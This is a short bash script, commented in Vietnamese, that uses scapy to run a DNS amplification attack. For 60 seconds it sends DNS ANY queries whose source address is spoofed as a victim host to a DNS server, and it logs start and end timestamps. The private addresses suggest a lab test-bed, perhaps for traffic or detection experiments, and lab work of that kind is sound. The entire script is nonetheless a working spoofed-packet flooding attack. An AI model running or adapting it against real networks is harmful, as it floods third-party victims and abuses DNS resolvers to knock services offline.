#!/bin/bash
VICTIM=10.0.2.10
DNS=10.0.2.11
DURATION=60

echo "Bat dau DNS Amplification vao $VICTIM (thong qua $DNS) trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Fix: PYTHONPATH="" de tranh conflict voi thu muc code/ trong project
# (scapy import 'code' module cua Python stdlib, bi shadow boi code/)
PYTHONPATH="" python3 -c "
from scapy.all import IP, UDP, DNS, DNSQR, send
import time
end = time.time() + $DURATION
pkt = IP(src='$VICTIM', dst='$DNS')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='example.com', qtype=255))
while time.time() < end:
    send(pkt, verbose=0)
" &
SCAPY_PID=$!

sleep $DURATION
kill $SCAPY_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong DNS Amplification!"